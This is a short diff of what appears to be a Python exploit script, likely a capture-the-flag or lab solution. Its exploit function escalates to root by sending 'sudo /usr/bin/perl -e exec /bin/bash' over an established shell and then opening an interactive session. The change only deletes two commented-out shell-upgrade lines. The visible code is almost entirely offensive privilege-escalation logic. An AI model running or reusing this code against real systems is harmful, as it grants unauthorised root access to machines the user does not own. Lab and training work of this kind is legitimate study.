@@ -37,8 +37,6 @@ def exploit(RHOST, user):
         shell.interactive()
     elif user==2:
         shell.sendline(f'''sudo /usr/bin/perl -e 'exec "/bin/bash";\''''.encode())
-        # shell.sendline("SHELL=/bin/bash script -q /dev/null".encode())
-        #shell.recvline().decode()
         print("Got the user Root!")
         shell.interactive()
     else:
